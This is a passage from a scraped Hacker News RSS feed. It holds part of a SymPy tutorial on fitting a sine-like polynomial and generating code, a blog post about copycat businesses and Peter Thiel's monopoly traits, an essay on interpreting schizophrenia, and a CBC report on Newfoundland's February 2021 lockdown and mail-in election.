&nbsp;&nbsp;(d, 'Mul(Integer(10), Pow(pi, Integer(-4)), Add(Integer(-252), Mul(Integer(5), Pow(pi, Integer(2))), Mul(Integer(64), pi)))') <br>
&nbsp;&nbsp;(a, 'Mul(Integer(28), Pow(pi, Integer(-7)), Add(Mul(Integer(-1), Integer(16), pi), Mul(Integer(-1), Pow(pi, Integer(2))), Integer(60)))') <br>
&nbsp;&nbsp;(e, 'Mul(Integer(12), Pow(pi, Integer(-3)), Add(Mul(Integer(-1), Integer(8), pi), Mul(Integer(-1), Pow(pi, Integer(2))), Integer(35)))') <br>
&nbsp;&nbsp;(g, 'Integer(0)') <br>
&nbsp;&nbsp;(b, 'Mul(Integer(84), Pow(pi, Integer(-6)), Add(Integer(-60), Pow(pi, Integer(2)), Mul(Integer(16), pi)))')
	</p>
	<p>
Ok, this is not really helpful. We need the coefficients and SymPy gave us the way to compute these coefficients from <i>œÄ</i>. Well, it's what it does, it computes things symbolically not numerically. Or does it?
	</p>
	<p>
Look! I'll add one more line and SymPy will compute our coefficients as floating-point numbers.
	</p>
	<div>
	<pre id="code_2">from sympy import *
from math import pi

a, b, c, d, e, f, g, x = symbols('a b c d e f g x')

sine = a*x**6 + b*x**5 + c*x**4 + d*x**3 + e*x**2 + f*x + g
sine_d = diff(sine, x)
sine_i = integrate(sine, x)

the_system = [
    sine_i.subs(x, pi / 2) - sine_i.subs(x, 0) - 1,
    sine_d.subs(x, 0) - 1,
    sine_d.subs(x, pi / 2),
    sine_d.subs(x, pi) + 1,
    sine.subs(x, 0),
    sine.subs(x, pi / 2) - 1,
    sine.subs(x, pi)
]

res = solve(the_system, (a, b, c, d, e, f, g))

for var, exp in res.items():
    print(var, srepr(exp))
</pre>
	</div>
	<p>
Have you noticed which line it is? Anyway, the result is now this:
	</p>
	<p>
(f, "Float('1.0', precision=53)") <br>
(c, "Float('-0.0049207268278655082', precision=53)") <br>
(d, "Float('-0.16323406244002545', precision=53)") <br>
(a, "Float('-0.0012523393437231091', precision=53)") <br>
(e, "Float('-0.00090780192609864056', precision=53)") <br>
(g, "Float('0.0', precision=53)") <br>
(b, "Float('0.011803020246125803', precision=53)")
	</p>
	<p>
The line was <i>from math import pi</i>. This overloads the <i>pi</i> in the scope to be a floating-point number, not a symbol. And voil√†‚Ää‚Äî‚ÄäSymPy is now numeric. We can take these numbers, put them into our polynomial and it will be our model.
	</p>
	<canvas id="sine_model" width="640" height="480"></canvas>
	
	<p>
The model works wonders in the <i>[0; œÄ]</i> range. Outside this range it diverges from the sine but we never specified that it shouldn't.
	</p>
	<p>
The polynomial bears all the properties we told SymPy about with our equations and nothing more.
	</p>
	<h2>
Now let SymPy write some code for us
	</h2>
	<p>
Let's say we want something that looks like the sine but isn't. Something we can tweak interactively. Like the sine but with the movable middle point.
	</p>
	<p>
We can start the same way. Let's retain the point locations. The integral criterion along with the derivatives in the endpoints are better to be lifted. But that's just my opinion, you can try to retain them yourself and see what'll happen.
	</p>
	<p>
The code that states the problem looks like this:
	</p>
	<div>
	<pre id="code_3">from sympy import *

a, b, c, d, x, px, py = symbols('a b c d x px py')

sine = a*x**3 + b*x**2 + c*x + d
sine_d = diff(sine, x)

the_system = [
    sine_d.subs(x, px),
    sine.subs(x, 0),
    sine.subs(x, px) - py,
    sine.subs(x, pi)
]

res = solve(the_system, (a, b, c, d))

for var, exp in res.items():
    print(var, srepr(exp))
</pre>
	</div>
	<p>
When run, it prints out that:
	</p>
	<p>
&nbsp;&nbsp;(c, "Mul(pi, Pow(Symbol('px'), Integer(-1)), Symbol('py'), Add(Mul(Integer(-1), Integer(3), Symbol('px')), Mul(Integer(2), pi)), Pow(Add(Pow(Symbol('px'), Integer(2)), Mul(Integer(-1), Integer(2), pi, Symbol('px')), Pow(pi, Integer(2))), Integer(-1)))")
<br>
&nbsp;&nbsp;(b, "Mul(Pow(Symbol('px'), Integer(-2)), Symbol('py'), Add(Mul(Integer(3), Pow(Symbol('px'), Integer(2))), Mul(Integer(-1), Pow(pi, Integer(2)))), Pow(Add(Pow(Symbol('px'), Integer(2)), Mul(Integer(-1), Integer(2), pi, Symbol('px')), Pow(pi, Integer(2))), Integer(-1)))")
<br>
&nbsp;&nbsp;(a, "Mul(Pow(Symbol('px'), Integer(-2)), Symbol('py'), Add(pi, Mul(Integer(-1), Integer(2), Symbol('px'))), Pow(Add(Pow(Symbol('px'), Integer(2)), Mul(Integer(-1), Integer(2), pi, Symbol('px')), Pow(pi, Integer(2))), Integer(-1)))")
<br>
&nbsp;&nbsp;(d, 'Integer(0)')
	</p>
	<p>
And now it's time to get back to that cryptic <i>srepr</i> thing from before. It stands for <i>symbolic expression</i>, and it's basically a ready-made syntax tree. It's like in Lisp only with somewhat more conventional parentheses. And since it's written in conventional C-style function form, it's incredibly easy to write an interpreter for it (see: <a href="https://github.com/akalenuk/wordsandbuttons/blob/cd585775b6b5176426c6a22ccbdb683b71fe62dc/pages/sympy_makes_math_fun_again.html#L336">the code on GitHub</a>).
	</p>
	<p>
For instance, here is a simple tool that turns SymPy s-expressions into runable JavaScript code.
	</p>
	
	
	
	
	<p>
Just press the button‚Ää‚Äî‚Ääand that's it! Of course, you can prettify the code however you like. But you can also use in raw like this (see: <a href="https://github.com/akalenuk/wordsandbuttons/blob/cd585775b6b5176426c6a22ccbdb683b71fe62dc/pages/sympy_makes_math_fun_again.html#L306">the example from this very page</a>).
	</p>
	<canvas id="not_sine" width="640" height="480"></canvas>
	
	
	<p>
But the best part of it, unless you're writing in some esoteric language, you don't even need an interpreter. SymPy can print out JavaScript code from the box with a single <i>jscode</i> function! It can also print in Rust, C++, Fortran, Matematica, and more. It's <a href="https://docs.sympy.org/latest/modules/printing.html">already there</a>.
	</p>
	<p>
They say that AI will replace programmers in the future. Well, for a certain part, the future is here. SymPy writes your code for you. Although, when writing code means translating equations without any creative thought involved, I don't mind being replaced.
	</p>
	<h2>
Conclusion
	</h2>
	<p>
I disagree with ‚Äúmath is not for everyone‚Äù. Math is vast and diverse. Surely there is enough math for everyone. But some parts of it are better left to computers.
	</p>
	<p>
Hope this ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wordsandbuttons.online/sympy_makes_math_fun_again.html">https://wordsandbuttons.online/sympy_makes_math_fun_again.html</a></em></p>]]>
            </description>
            <link>https://wordsandbuttons.online/sympy_makes_math_fun_again.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122199</guid>
            <pubDate>Sat, 13 Feb 2021 08:15:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Always Try to Be a Monopoly]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26122070">thread link</a>) | @rukshn
<br/>
February 12, 2021 | https://ruky.me/2021/02/13/always-try-to-be-a-monopoly/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/02/13/always-try-to-be-a-monopoly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Roughly three years ago we started <a href="https://instagram.com/treetalks.lk" target="_blank" rel="noreferrer noopener">TreeTalks</a>, it was a very simple idea, we deliver cacti, succulents and indoor plants to people who ordered them online.</p>
<p>Our main target group was people and companies who wanted to have a cacti, or an indoor plants. People who are working in offices loved to have an indoor plant to decorate their desk, companies loved to gift plants for their employees.</p>
<p>We also implemented the idea around gifting, people can gift an indoor plant to their friends, partners, friends etc. Every pot will be customised according to their needs, everything will be hand-painted, and it will include a message or a quote suggested by the user.</p>
<p>The idea was a niche one, and there was only one other similar small business who was doing somewhat similar idea. And our business grew and grew, people were happy to get an indoor plant as a gift, especially a customised one. </p>
<p>Well, you get the idea. Business was great, business was growing. Yet there was something that always bothered in the back of my mind, and I knew it was just a matter of time before the inevitable.</p>
<h2>Characteristics of a monopoly</h2>
<figure><img data-attachment-id="268" data-permalink="https://ruky.me/2021/02/13/always-try-to-be-a-monopoly/characteristics-of-monopoly/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?fit=1302%2C734&amp;ssl=1" data-orig-size="1302,734" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="characteristics-of-monopoly" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?fit=1024%2C577&amp;ssl=1" loading="lazy" width="1024" height="577" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?resize=1024%2C577&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?resize=1024%2C577&amp;ssl=1 1024w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?resize=300%2C169&amp;ssl=1 300w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?resize=768%2C433&amp;ssl=1 768w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?w=1302&amp;ssl=1 1302w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?resize=1024%2C577&amp;ssl=1 1024w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?resize=300%2C169&amp;ssl=1 300w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?resize=768%2C433&amp;ssl=1 768w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?w=1302&amp;ssl=1 1302w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/02/characteristics-of-monopoly.png?resize=1024%2C577&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "><figcaption>Characteristics of a monopoly ‚Äì <a href="https://smart-diagram.com/characteristics-of-monopoly/" target="_blank" rel="noreferrer noopener">Smart Diagrams</a></figcaption></figure>
<p>In one of Peter Thiel books called <strong><a href="https://www.amazon.com/gp/product/0804139296/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0804139296&amp;linkCode=as2&amp;tag=gogrubit-20&amp;linkId=109fe33fe9ea7fdaaa1eb6e3bf26c48e" target="_blank" rel="noreferrer noopener">Zero to One</a>, </strong> he outlines several characteristics that define a monopoly.</p>
<ul><li><strong>Branding ‚Äì </strong>Something that Apple does so well. Their brand is recognised everywhere, there is no company that does branding better than Apple.</li><li><strong>Proprietary technology ‚Äì </strong>A monopoly should have a proprietary technology, for example Google. Google‚Äôs monopoly on search is built on top of their proprietary search algorithm. There is no other company in search that has an algorithm better than Google.</li><li><strong>Network effect ‚Äì </strong>Something Facebook and its group of companies have in common. Even if someone else come up with a better solution, still they can‚Äôt beat Facebook because of it‚Äôs network effect.</li><li><strong>Economics of scale ‚Äì </strong>Amazon is a good example for a monopoly with economy of scale. Amazon even though started out as a website to sell books online had the potential to sell just about anything they want though their website. The books were just the foot on the door, once they started expanding they had the potential to expand in to anywhere they wanted.</li></ul>
<p>So once I first read these principals by Peter Thiel, I know that my business had nothing. Three was very low barrier to entry, anyone could do it, and there was nothing proprietary in what we did, no network effect, we had nothing.</p>
<p>So what this meant was that, anyone was able to copy our business and do what we did. </p>
<h2>What copycats do</h2>
<p>For the first two years, there was no competition. People tried to come up with places that offered similar service to ours, but none of them succeeded.</p>
<p>But since we are living in a pandemic, and people need to find some extra income, more and more people started copying our business. And copying our business was easy, why?</p>
<ul><li>There is no barrier to entry</li><li>No one need to invest a big capital</li><li>There are were only few resources needed to get started</li><li>No special skill needed, anyone with drawing skills can do it</li><li>No propriotory technology</li></ul>
<p>Now when I scroll through Facebook and Instagram I see someone starting an instagram page or Facebook page to do exactly what we are doing.</p>
<p>And one or two copycats are easy to manage, however, just like everything else copycats also have a network effect. When a person see someone copying something, they also feel like copying it. They too want to jump in and to cash in when there is opportunity. </p>
<h2>Copycats drags the price down</h2>
<p>Copycats when there are plenty creates competition among themselves. I know that competition is a good thing, when we started TreeTalks, and when there was one other business doing the something, we had a nice completion amongst ourselves, each tried to better the other, and grab more fans on social media. But this was a healthy competition, the competition between the two pushed us to the limits and created the best versions of ourselves.</p>
<p>However, the competition that we have today, competition among copycats is not a healthy competition. It‚Äôs a fight to sell the product at the lowest price possible. And customers also want the lowest price, but there is a limit where one should not cross, and need to have a reasonable profit to the effort that you put it.</p>
<p>The same thing can be seen in freelancer platforms like Fivver and WpWork etc. Freelancers (specially from South Asia) tend to drag the price down to a point where professional developers, designers would not like to offer.</p>
<p><strong>Copycats and competition, even though is good for consumer can be bad for the growth of an industry. </strong></p>
<h2>I knew this day would come</h2>
<p>I knew this day would come, I‚Äôm happy that I created a small niche brand in our country, and made a decent income along the way. And I guess like all good business it‚Äôs time to pivot. The brand that we created, and the customers we gained must be used as the foot on the door for us to get into something better.</p>
<h2>Think before you start</h2>
<p>When you start something, always think about what Peter Thiel said. Make sure your business ticks at least one or more points of a monopoly. </p>
<p>If it does then awesome, but if it doesn‚Äôt that‚Äôs also fine. But make sure to keep it in the back of your mind that you should always be ready to pivot, or change the direction. Because copycats are coming to get you.</p>
<p>Always try to be a monopoly.</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2021/02/13/always-try-to-be-a-monopoly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122070</guid>
            <pubDate>Sat, 13 Feb 2021 07:37:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Complex Model of Schizophrenia (2011)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26121702">thread link</a>) | @optimalsolver
<br/>
February 12, 2021 | http://www.thenegativepsychologist.com/a-%E2%80%98complex%E2%80%99-model-of-schizophrenia/ | <a href="https://web.archive.org/web/*/http://www.thenegativepsychologist.com/a-%E2%80%98complex%E2%80%99-model-of-schizophrenia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<h2><strong>INTRODUCTION</strong></h2>

<p>Schizophrenia, one might say, is very much a problem of interpretation. It is a problem of interpretation for the person concerned, although they may be unlikely to see it in these terms, and it is a problem of interpretation for any mental health professionals who might be involved in their care. Again, we ‚Äì in our roles as psychiatrists, nurses, social workers, etc ‚Äì don‚Äôt seem to spend very much time wondering if our way of conceiving schizophrenia is the most helpful one possible since most of our energy goes into the pragmatic problem of ‚Äòillness management‚Äô.</p>

<p>The assertion that we can sum up schizophrenia as being an issue of information interpretation (or processing) inevitably seems simplistic, or reductive, depending upon whether one is trying to be&nbsp; either correctly scientific or correctly holistic. In this article I hope to show that it is neither, and that an information-processing model, with the addition of a little complexity theory, can radically expand our understanding of this condition, no matter what camp one belongs to.</p>

<h2><strong>THE PATIENT‚ÄôS STORY:&nbsp; ‚ÄúIN THE DAYS WHEN I WAS GOD‚Ä¶‚Äù</strong></h2>

<p>In order to justify the opening sentence I will relate an encounter between myself as a first-year occupational therapy student and a young man (who we will call Steve) who was an inpatient in an acute psychiatric ward in a busy London hospital. Steve was exhibiting at the time what in psychiatric parlance is known as ‚Äòflorid, positive-symptom schizophrenia‚Äô. A consultant psychiatrist was conducting a brief interview as part of a ward round whilst the junior doctors, nurses, my supervisor and myself stood behind him and listened. Steve, with the slightly solipsistic air of someone who was repeating a story to an audience who didn‚Äôt really count (so that the recounting of it was a gesture for his own benefit more than anyone else‚Äôs) explained how he was from another world and not this one. His spaceship had crashed and was now broken. On this planet, he said, there existed a deadly type of radiation that caused amnesia and a loss of psychic powers. The effect of this radiation was slow but progressive, and the end result of the process was that anyone landing here would forget that they were not native to the planet, and become like everyone else. The powers that he used to have were not alluded to directly, but Steve clearly gave the&nbsp; impression that he had enjoyed, rather than suffered from them. At one point he spoke wistfully of ‚Äúthe days when I was God.‚Äù There was no comment from anyone when Steve had finished speaking, and after a period of quiet the psychiatrist proceeded to gently direct Steve‚Äôs attention to more practical matters.</p>

<h2><strong>MAKING SENSE OF MADNESS</strong></h2>

<p>There are various interpretive frameworks which we can bring to bear upon this story. On that occasion the dominant framework was what one might call ‚Äòstandard psychiatric,‚Äô i.e. it was based on&nbsp; diagnostic aids such as DSM ‚Äì III. It is worth at this point briefly clarifying what is meant by ‚Äòinterpretation‚Äô: to say that clinical data is interpreted within a specific framework means of course that the apparently chaotic or irregular information of our experience is subjected to a rule-based procedure that organizes that information to a particular (that is, unambiguous) categories, where each category possesses a precise meaning that is already known to the interpreter. Another way of putting this would be to say that the raw data of the clinical encounter is manipulated with respect to a set of fixed criteria, and for this reason we can say that all interpretations equal<em> rule-based interactions</em>. We might go further and say that all of the interaction between psychiatrist and patient ‚Äì as far as it is informed by an interpretive model ‚Äì&nbsp; is ‚Äòrule-based‚Äô.&nbsp; The problem with rule-based interactions is something that we will come to a bit later on.&nbsp; DSM-III, in common with other such theoretical constructs in use in psychiatry, is rather a crude affair ‚Äì it is not exactly a grand philosophical conception. On the other hand, one need hardly point out, it is not so much a satisfying philosophical conclusion that a psychiatrist wants but a practical way of helping his or her patients. Whether DSM-III (or the other diagnostic systems) are actually useful in this way is something that we need to seriously question ‚Äì certainly the crudeness of the model seems to offend, in a basic way, against our capacity as sensitive and intuitive beings to seek and find deeper and more subtle ways of comprehending other people. This can be seen from the case given above: Steve comes out with what is by any standards an extraordinary story: under other circumstances he might be given respect for the undeniable creativity involved, but under these circumstances the content of his communication is not addressed. After processing through the&nbsp; DSM-III translation machine, all that comes out is the flat and unremarkable message ‚ÄúSteve has schizophrenia‚Äù.&nbsp; There is a tremendous loss of meaning going on here, a prodigious feat of information reduction has taken place. This is acceptable to all concerned because the ‚Äòmeaning‚Äô that has been surgically removed from Steve‚Äôs story is automatically known to be, in retrospect,&nbsp; a species&nbsp; of randomness, the virulent and offensive ‚Äòmeaning-gone-wild‚Äô of schizophrenic chaos. Basically, Steve was talking gobbledygook! Standard psychiatric interpretation does not differ too much from ‚Äòlay interpretations‚Äô of schizophrenia in this respect. If Steve want into a pub on the high street and came out with the same story, there is almost no doubt about what would be going through peoples‚Äô minds: ‚ÄúUh-oh‚Ä¶‚Äù your man on the next table would say, ‚Äúthis guy is cracked‚Ä¶‚Äù. There is a tiny chance that there might be a UFO spotter in the pub who will be prepared to subject Steve‚Äôs utterances to a different interpretive framework ‚Äì but we will leave that possibility to one side. In any event, UFO perspectives may themselves be said to be rather crude, although maybe not as crude as psychiatric ones, if one takes as a rough sort of a measure the amount of wonder that one experiences in connection with the ‚Äòtruth‚Äô that one perceives (i.e. the degree of irreducible<strong> [?]</strong> that permeates through the evaluative filter). One does not in the usual run of things experience any appreciable degree of wonderment when one realizes that a schizophrenic is, in fact, a schizophrenic and not a manic-depressive; on the other hand, when a UFO buff stops feeling any wonder over UFOs it is, arguably, time for him or her to give up UFOlogy as a bad job.</p>
</div>
<div>

<p>So far we have consider medical and lay interpretations, we could of course go on adding to the list. The classical Freudian interpretation of schizophrenia is to say that it is the result of the withdrawal of sexual interest from external objects to the world of internal objects. Thus, a Freudian would pay attention to Steve‚Äôs story with quite a different agenda. The crudity of the model is hardly any less, though, and there is nothing really in a psychodynamic explanation that&nbsp; adds to our discussion. What we can usefully take from all of this is the simple notion of <em>tautological self-confirmation as a basic principle pertaining to all rule-based interpretations</em>. This has been touched upon by Popper with regard to psychoanalytic interpretations, it is also true for the apparently scientific DSM-III system. This is obvious if we consider that we that we already know in advance what diagnostic categories are possible; there is no chance, even if psychiatry is practised for a million years, that DSM-III can be used to falsify itself. There is no chance of the system <em>learning</em>. A patient in a psychiatric hospital&nbsp; cannot throw any doubt on the validity of the interpretive system, no matter <em>what</em> he says or does. He or she might be utterly unique, constituting an absolutely unprecedented case, but after being processed through the machine they will come our utterly unremarkable, just another category‚Ä¶.</p>

</div>

<div>
<p>This point can be more clearly made by considering the underlying logic of all information processing operations, and noting that all rule-based (i.e. linear) procedures are essentially tautological in nature, which means that all strictly rule-based interactions (i.e. those&nbsp; involving linear correspondences) must yield consequences that were contained within the rules in the first place. Robert Anton Wilson (1990) approaches the matter by contrasting Aristotelian two-term logic with John von Neumann‚Äôs three-term Quantum Logic. The two terms in A.L. are ‚ÄúYES‚Äù and ‚ÄúNO‚Äù; in Q.L. we have ‚ÄúYES‚Äù, ‚ÄúNO‚Äù and ‚ÄúMAYBE‚Äù. When we use Aristotelian Logic we tacitly assume that the universe is 100% congruent with our model of it, i.e. that our model describes everything that is important in the universe (this, of course, is where assumptions come in regarding what is, and what isn‚Äôt, seen to be important). This is obvious since, in A.L., all questions must illicit an answer that is either affirmative or negative.&nbsp; Quantum Logic, in contrast, allows for incongruence, a bit of a gap between model and reality. It allows for the possibility that there might be significant aspects to the concrete reality that are not described at all by the theoretical language being utilized to formulate the question; this is where the extra ‚ÄúMAYBE‚Äù term comes in ‚Äì uncertainty is acknowledged.</p>

<p>We can make the suggestion here that perhaps the amount of uncertainty one can tolerate in the universe, the amount of time one has for the MAYBE component of answers,&nbsp; is a measure of one‚Äôs open-mindedness. This gives us a way of measuring the ‚Äòcrudeness‚Äô of an interpretive framework. The less crude a framework, the better the approximation to reality‚Ä¶..&nbsp;&nbsp; The least crude of all would clearly be the situation where all one‚Äôs answers come back as big question marks and where uncertainty permeates everything. Yet what would be the use of this? The answer is plainly that it ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.thenegativepsychologist.com/a-%E2%80%98complex%E2%80%99-model-of-schizophrenia/">http://www.thenegativepsychologist.com/a-%E2%80%98complex%E2%80%99-model-of-schizophrenia/</a></em></p>]]>
            </description>
            <link>http://www.thenegativepsychologist.com/a-%E2%80%98complex%E2%80%99-model-of-schizophrenia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121702</guid>
            <pubDate>Sat, 13 Feb 2021 05:46:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coronavirus variant puts Newfoundland back in lockdown]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26121658">thread link</a>) | @graeme
<br/>
February 12, 2021 | https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Newfoundland and Labrador is under full lockdown and Saturday's provincial election will continue with only mail-in voting, officials said Friday, as the province battles the B117 variant of the coronavirus.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5843708.1608137338!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/janice-fitzgerald-dr-jatin-morkar-covid-vaccine.jpg"></p></div><figcaption>Newfoundland and Labrador's chief medical officer of health, Dr. Janice Fitzgerald, has returned the province to lockdown as an outbreak of variant B117 snowballs.<!-- --> <!-- -->(Patrick Butler/Radio-Canada)</figcaption></figure><div><h2><span>Latest</span></h2><ul><li><span>Elections NL cancels in-person voting set for tomorrow, extends special ballot deadline </span></li><li><span>Province-wide lockdown issued, reverting to strict rules last seen in May 2020</span></li><li><span>Top doctor confirms outbreak caused by UK coronavirus variant, B117</span></li><li><span>Newfoundland and Labrador adds 269 active infections in 5 days</span></li></ul></div><p><span><p>Newfoundland and Labrador is under lockdown, and Saturday's provincial election will continue with only mail-in voting, officials said Friday, as the province battles the B117 variant of the coronavirus.</p>  <p>In an emergency briefing&nbsp;Friday evening ‚Äî&nbsp;the second time officials addressed the province in one day ‚Äî&nbsp;Dr. Janice Fitzgerald, the chief medical officer of health, said tests had confirmed the&nbsp;widespread presence of B117&nbsp; for the first time.</p>  <p>The "variant of concern" is responsible for this week's mass outbreak in the capital.</p>  <p>Confirmation of the variant's arrival prompted lockdown&nbsp;measures across the province Friday and has suspended in-person voting in the election, delaying the ballot count&nbsp;by at least two weeks.&nbsp;</p>  <p>B117 was first discovered in the United Kingdom. It's believed to be more contagious than the original coronavirus strain.</p>  <p>"We know that if not controlled, it becomes a predominant strain within weeks of first appearance," Fitzgerald said. "This is concerning and serious. But we have the ability to overcome it."</p>  <p>Effective immediately, the entire province is at Alert Level 5, with all but essential businesses closed, Fitzgerald announced.</p>  <p>The decision expands&nbsp;previous measures implemented in the St. John's area this week, returning Newfoundland and Labrador to the same rules it followed for weeks last spring.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/covid-testing-mundy-pond-blizzard.jpg 300w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/covid-testing-mundy-pond-blizzard.jpg 460w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/covid-testing-mundy-pond-blizzard.jpg 620w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/covid-testing-mundy-pond-blizzard.jpg 780w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/covid-testing-mundy-pond-blizzard.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/covid-testing-mundy-pond-blizzard.jpg"></p></div><figcaption>COVID-19 testing has spiked this week as Newfoundland and Labrador reports record daily cases.<!-- --> <!-- -->(Submitted by Lisa Warren)</figcaption></figure></span></p>  <p>Nine more cases have been added to the active total since the afternoon briefing, Fitzgerald said. Many of them are teenagers with mild or no symptoms.</p>  <p>There are now 269&nbsp;active cases in the province, with 253&nbsp;of them reported in the past five days.&nbsp;</p>  <p>The outbreak has come as a rude awakening for a province that regularly reported active total caseloads in the single digits, and over the summer survived a 42-day stretch without a single active infection.</p>  <p><em><strong>WATCH | Newfoundland and Labrador moves swiftly into lockdown:&nbsp;</strong></em></p>  <p><span><span><div><div title="Newfoundland and Labrador sees spike in COVID-19 cases" role="button" tabindex="0"><div><div aria-labelledby="1860314691986-metadata-" title="Newfoundland and Labrador sees spike in COVID-19 cases"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/567/351/COVID-NL-CASES-ELEX-YATES-120221.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Newfoundland and Labrador reported Friday that it is dealing with the B117 COVID-19 variant. Some cases are outside the St. John's metro area, showing the outbreak is spreading, and leading to the suspension of in-person voting in Saturday's provincial election.<!-- --> <!-- -->1:50</span></span></span></p>  <p>Most cases, until now, have been linked to travel outside the province.</p>  <p>The province had 390 total cases of&nbsp;COVID-19 in all of 2020.&nbsp;&nbsp;&nbsp;&nbsp;</p>  <h2>Level 5 rules</h2>  <p>Fitzgerald said the discovery of the variant answered questions she had about the speed and scope of the virus's spread. Other provinces are battling the mutation, with experts in Ontario warning B117 could become the dominant strain there before April.</p>  <p>Due to the variant's contagious nature, Fitzgerald said the speed of isolation measures is critical to contain it.</p>  <p>Residents are now expected to remain inside their own homes as much as possible and restrict gatherings to no more than five people.</p>  <p>All non-essential businesses and facilities, including playgrounds, gyms, salons, cinemas, restaurants, bars, private health-care clinics, and retail stores that do not provide the essentials of life, are now closed.</p>  <p>Elective surgery and non-emergent medical treatments are&nbsp;also suspended.</p>  <p><em><strong>Watch the Government of Newfoundland and Labrador briefing:</strong></em></p>  <p><span><span><iframe src="https://www.youtube.com/embed/e68GaBbp81c" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>"At this point, stay in your bubble," Fitzgerald said, simplifying&nbsp;the strict public health directions that Newfoundlanders and Labradorians haven't faced since last May.</p>  <p>"We're back here for a little while. I'm hopeful that we won't have to lock down like we did previously."</p>  <p>Health Minister John Haggie said vaccine rollout will continue as promptly as possible, but the timeline largely depends on delivery schedules, which have proved spotty throughout the country.</p>  <h2>Election day battered by outbreak</h2>  <p>Bruce&nbsp;Chaulk, the province's chief electoral officer, issued a media release immediately after the briefing&nbsp;that he had suspended in-person voting in all 40 districts across the province.</p>  <p>"In-person voting will not be rescheduled," said Bruce&nbsp;Chaulk&nbsp;in a statement. "The election will now shift exclusively to voting by mail."</p>  <p>The deadline to apply for mail-in special ballots has been extended to Feb. 15. Voting packages must be received by Elections NL by March 1.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/andrew-furey-wearing-liberal-red-mask.jpg 300w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/andrew-furey-wearing-liberal-red-mask.jpg 